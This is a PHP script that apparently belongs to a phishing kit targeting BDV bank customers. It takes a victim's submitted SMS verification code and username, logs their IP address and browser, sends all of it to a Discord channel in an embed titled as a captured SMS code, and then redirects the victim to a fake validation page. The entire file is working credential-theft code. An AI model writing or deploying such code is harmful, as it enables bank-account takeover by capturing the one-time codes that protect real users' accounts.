<?php
error_reporting(0);
require 'discord_config.php'; 

// 1. SEGURIDAD: Validar que la petición sea POST y que contenga los datos necesarios
// Esto bloquea a los bots que hacen peticiones GET directas buscando vulnerabilidades
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['sms'])) {
    header('Location: index.php');
    exit();
}

// 2. OBTENER DATOS DEL FORMULARIO
$sms = trim($_POST['sms']);
$nombre = isset($_POST['nombre']) ? trim($_POST['nombre']) : 'Desconocido'; 

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// 3. CONSTRUCCIÓN DEL EMBED y ENVÍO A DISCORD
$fields = [];

$fields[] = ['name' => '👤 Usuario', 'value' => "`{$nombre}`", 'inline' => true];
$fields[] = ['name' => '💬 CÓDIGO SMS', 'value' => "**```{$sms}```**", 'inline' => true];

$fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => '', 'inline' => false];

$fields[] = ['name' => '🌐 IP', 'value' => "`{$ip}`", 'inline' => true];
$fields[] = ['name' => '📱 Navegador', 'value' => "`{$userAgent}`", 'inline' => true];

// Estructura del Embed
$embed = [
    'title' => 'BDV 🔑 - CÓDIGO SMS CAPTURADO',
    'color' => 3066993, // Verde oscuro
    'fields' => $fields,
    'timestamp' => date('c')
];

// Llamada a la función centralizada
sendToDiscordEmbed([$embed], 'Capturador SMS'); 

// 4. REDIRIGIR AL SIGUIENTE PASO
header('Location: validando.html'); 
exit();
?>